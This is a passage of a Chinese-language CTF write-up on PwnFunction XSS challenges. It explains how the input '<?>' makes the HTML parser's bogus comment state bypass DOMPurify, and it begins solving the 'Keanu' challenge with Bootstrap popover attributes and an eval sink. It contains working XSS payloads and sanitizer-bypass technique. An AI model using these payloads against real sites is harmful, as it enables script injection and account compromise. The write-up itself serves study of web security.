VusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5728;&#x7B2C;&#x4E00;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F20;&#x5165;&#x7684;<code>&lt;?</code>&#x5DF2;&#x7ECF;&#x53D8;&#x6210;&#x4E86;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x5B58;&#x5728;<code>--&gt;</code>&#x53EF;&#x4EE5;&#x5C06;&#x6CE8;&#x91CA;&#x95ED;&#x5408;&#x3002;&#x53EF;&#x662F;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x5728;<code>template.innerHTML = input</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E3;&#x6790;<code>input</code>&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;</p><blockquote><p>&#x200B;    Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></blockquote><p>&#x89E3;&#x6790;&#x5230;<code>&lt;</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;HTML parser &#x6B63;&#x5904;&#x4E8E; <a href="https://www.w3.org/TR/html52/syntax.html#data-state" target="_blank" rel="noopener">data state</a></p><blockquote><p>Data state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&amp;)</p><p>Set the <a href="https://www.w3.org/TR/html52/syntax.html#return-state" target="_blank" rel="noopener">return state</a> to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state" target="_blank" rel="noopener">character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li></ul></blockquote><p>&#x4E8E;&#x662F;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state" target="_blank" rel="noopener">end tag open state</a>.</p></li><li><p><a href="https://www.w3.org/TR/html52/infrastructure.html#ascii-letters" target="_blank" rel="noopener">ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state" target="_blank" rel="noopener">tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Create a comment token whose data is the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>.</p></li><li><p>Anything else</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F;<code>?</code>&#xFF0C;&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;HTML parser &#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; comment token&#xFF0C;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>&#xFF0C;</p><blockquote><p>Bogus comment state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token&#x2019;s data.</p></li><li><p>Anything else</p><p>Append the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> to the comment token&#x2019;s data.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F; anything else&#xFF0C;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x63D2;&#x5165;&#x5230;&#x521A;&#x521A;&#x7684; comment &#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x56FE;&#x770B;&#x5230;&#x7684;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x4F8B;&#x5982;&#x8F93;&#x5165;&#x662F;<code>aaa&lt;?bbb&gt;ccc</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x89E3;&#x6790;&#x5230;&#x7B2C; i &#x4E2A;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;innerHTML &#x7684;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight django hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">a</span></span><br><span class="line"><span class="hljs-xml">aa</span></span><br><span class="line"><span class="hljs-xml">aaa</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-tag">&lt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?b--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>c</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>cc</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>ccc</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x76F4;&#x5230;&#x8BE5;&#x72B6;&#x6001;&#x9047;&#x5230;&#x4E86;<code>&gt;</code>&#x4E3A;&#x6B62;&#xFF0C;&#x56DE;&#x5230; data state&#x3002;&#x6CE8;&#x610F;&#x8FD9;&#x4E2A; Bogus comment state &#x89E3;&#x6790;&#x5230;<code>&gt;</code>&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x56DE;&#x5230; data state&#xFF0C;&#x4E5F;&#x5C31;&#x662F; HTML parser &#x6700;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63D2;&#x5165; HTML &#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>&lt;?&gt;&lt;svg onload=alert()&gt;</code>&#x65F6;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E8C;&#x6B65;<code>pwnme.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x5019; HTML parser &#x89E3;&#x6790;&#x4E0E;&#x6211;&#x4EEC;&#x5728; Easy Version &#x5206;&#x6790;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x6709;&#x9047;&#x5230;<code>--&gt;</code>&#x7684;&#x65F6;&#x5019;&#x7ED3;&#x675F; Comment State &#x76F8;&#x5173;&#x72B6;&#x6001;&#x56DE;&#x5230; data state&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86; XSS&#x3002;</p><h2 id="Keanu"><a href="#Keanu" class="headerlink" title="Keanu"></a>Keanu</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">number</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">number</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcome&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-sm&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;DM @PwnFunction&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">data-trigger</span>=<span class="hljs-string">&quot;hover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;</span>&gt;</span>Solved it?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Input */</span></span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> number = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;number&apos;</span>) || <span class="hljs-string">&quot;7&quot;</span>)[<span class="hljs-number">0</span>],</span></span><br><span class="line"><span class="hljs-actionscript">        name = DOMPurify.sanitize(<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;name&apos;</span>), { SAFE_FOR_JQUERY: <span class="hljs-literal">true</span> });</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;number#number&apos;</span>).html(number);</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#welcome&apos;</span>).html(<span class="hljs-string">`Welcome &lt;b&gt;<span class="hljs-subst">${name || <span class="hljs-string">&quot;Mr. Wick&quot;</span>}</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Greet */</span></span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;show&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;hide&apos;</span>)</span></span><br><span class="line">    }, 2000)</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> magicNumber = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> number = <span class="hljs-built_in">eval</span>($(<span class="hljs-string">&apos;number#number&apos;</span>).html());</span></span><br><span class="line">    if (magicNumber === number) {</span><br><span class="line"><span class="hljs-actionscript">        alert(<span class="hljs-string">&quot;You&apos;re Breathtaking!&quot;</span>)</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x672C;&#x9898;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x4E86;&#x56DB;&#x4E2A; js &#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.4.1.slim.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x989D;&#x5916;&#x7ED9;&#x6211;&#x4EEC;&#x589E;&#x52A0;&#x7684;&#x8FD9;&#x51E0;&#x4E2A; js &#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x8FD9;&#x9053;&#x9898;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x7684;&#x5DE5;&#x5177;&#x4E86;&#x3002;</p><p>Purify.js &#x662F;&#x4E00;&#x4E2A; XSS WAF&#xFF0C;Popper.js&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x63D0;&#x793A;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x9898;&#x76EE;&#x4E2D;&#x4E5F;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F7F;&#x7528; popper &#x7684;&#x4F8B;&#x5B50;&#xFF0C;Jqeury.js &#x4E0E; Bootstrap &#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; name &#x53C2;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F; number &#x53C2;&#x6570;&#x3002;&#x7136;&#x800C; number &#x53C2;&#x6570;&#x6211;&#x4EEC;&#x5374;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4F4D;&#xFF0C;&#x800C; name &#x53C2;&#x6570;&#x867D;&#x7136;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x53EF;&#x63A7;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x7ECF;&#x8FC7; XSS WAF &#x8FC7;&#x6EE4;&#x3002;&#x867D;&#x7136;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x4E9B;&#x5229;&#x7528; mxss bypass Domprify &#x7684;&#x4E8B;&#x4F8B;&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x662F;&#x5728; 2.0 &#x5DE6;&#x53F3;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; 2.0.7 &#x53C8;&#x662F;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x662F;&#x4EC0;&#x4E48;&#x65B0;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x5426;&#x5219; number &#x53C2;&#x6570;&#x4E0E;&#x6700;&#x540E;&#x7684; <code>eval($(&quot;number#number&quot;).html());</code> &#x5C31;&#x6CA1;&#x7528;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x7528;&#x4E0A;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x80FD;&#x7528;&#x5230;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>eval($(&quot;number#number&quot;).html())</code>&#x8FDB;&#x884C; XSS &#xFF0C;&#x800C; number &#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x53EA;&#x6709;&#x4E00;&#x4F4D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x5F97;&#x60F3;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x529E;&#x6CD5;&#x6DFB;&#x52A0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; <a href="https://getbootstrap.com/docs/4.0/components/popovers" target="_blank" rel="noopener">popper document</a> &#x7ED3;&#x5408;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x90A3;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C8C;&#x4F3C;&#x8FD9;&#x4E2A; popper.js &#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x6DFB;&#x52A0;&#x65B0;&#x5185;&#x5BB9;&#x6761;&#x4EF6;&#xFF0C;&#x800C;&#x5728;&#x6587;&#x6863; <a href="https://getbootstrap.com/docs/4.0/components/popovers/#options" target="_blank" rel="noopener">options</a> &#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5230;&#x6709;&#x4E00;&#x4E9B;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x5173;&#x6CE8;&#x7684;&#x53C2;&#x6570;&#xFF1A;</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string | element | false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: &apos;body&apos;</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string | element | function</td><td>&#x2018;&#x2019;</td><td>Default content value if <code>data-content</code> attribute isn&#x2019;t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x6587;&#x6863;&#x77E5;&#x9053;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>data-container</code>&#x6765;&#x63A7;&#x5236; popover &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;<code>data-content</code>&#x6765;&#x63A7;&#x5236;&#x5185;&#x5BB9;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#x628A;&#x8FD9;&#x4E2A; popover &#x5F04;&#x5230; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x5462;&#xFF1F;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x5982;&#x4E0B; payload &#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5229;&#x7528;&#x9898;&#x76EE;&#x4E2D;&#x539F;&#x6709;&#x7684;<code>$(&quot;#keanu&quot;).popover(&quot;show&quot;);</code>&#x6765;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x7684; popover &#xFF0C;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x5148;&#x6CE8;&#x91CA;&#x6389;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#x7684;&#x5EF6;&#x8FDF;&#x5173;&#x95ED;&#x7684;&#x529F;&#x80FD;&#x4EE5;&#x4FBF;&#x4E8E;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x3002;</p><p><img 